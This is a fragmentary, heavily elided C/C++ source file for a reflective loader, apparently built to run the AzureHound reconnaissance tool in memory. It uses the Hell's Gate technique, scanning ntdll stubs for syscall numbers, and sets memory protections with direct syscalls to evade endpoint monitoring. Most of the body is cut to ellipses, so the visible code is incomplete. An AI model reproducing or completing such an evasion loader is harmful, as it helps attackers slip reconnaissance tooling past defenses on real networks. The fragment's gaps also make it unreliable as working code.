// ============================================================================
// AzureHound Reflective Loader - Hell's Gate + Per‑Section Permissions
// ============================================================================
...
static uint32_t ExtractSyscallNumber(FARPROC pFunc) {
    ...
    // Print first 32 bytes to see the real stub
    ...
    for (int i = 0; i < 32; i++) {
        if (p[i] == 0x0F && p[i+1] == 0x05) {
            ...
            // Scan backward for mov eax (B8) within 16 bytes
    ...
    // Fallback: search for B8 ... 0F 05 pattern directly
    for (int i = 0; i < 32; i++) {
        if (p[i] == 0xB8 && p[i+5] == 0x0F && p[i+6] == 0x05) {
            uint32_t ssn = *(uint32_t*)(p + i + 1);
            DbgPrint("[*] Found pattern B8 ... 0F 05 at offset %d, SSN = 0x%08X\n", i, ssn);
            return ssn;
        }
    }
...
static bool SetImageProtection(DWORD prot) {
    ...
    bool ok = SysProtect(base, size, prot);
...
extern "C" int __cdecl main(int argc, char* argv[]) {
    DbgPrint("================================================================\n");
    DbgPrint(" AzureHound Reflective Loader - Hell's Gate + Per-Section Perms\n");
    DbgPrint("================================================================\n");
